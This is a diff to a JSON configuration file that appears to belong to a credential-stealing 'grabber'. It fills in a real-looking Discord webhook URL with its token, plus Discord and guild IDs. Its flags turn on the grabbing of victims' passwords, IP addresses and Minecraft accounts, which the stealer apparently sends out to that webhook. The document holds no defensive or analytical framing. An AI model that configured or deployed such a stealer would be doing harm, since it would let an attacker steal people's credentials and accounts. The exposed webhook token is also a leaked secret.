@@ -1,11 +1,11 @@
 {
-    "webhook": "WEBHOOK HERE",
-    "discord_id": "ENTER YOUR DISCORD ID",
-    "guild_id": "ENTER YOUR GUILD ID",
+    "webhook": "https://discord.com/api/webhooks/1008478625764487310/sXB5V9ROc_FThOZH6tCFp0CXV1EqJJrU9zwZn8_rg_rEDoUNETasCXg5ge2t1UWhkIOQ",
+    "discord_id": "985118286918352916",
+    "guild_id": "633565743103082527",
     
-    "grab_webcam": true, 
+    "grab_webcam": false, 
     "grab_ip": true,
 
     "grab_password": "true",
-    "grab_minecraft": "false"
+    "grab_minecraft": "true"
 }
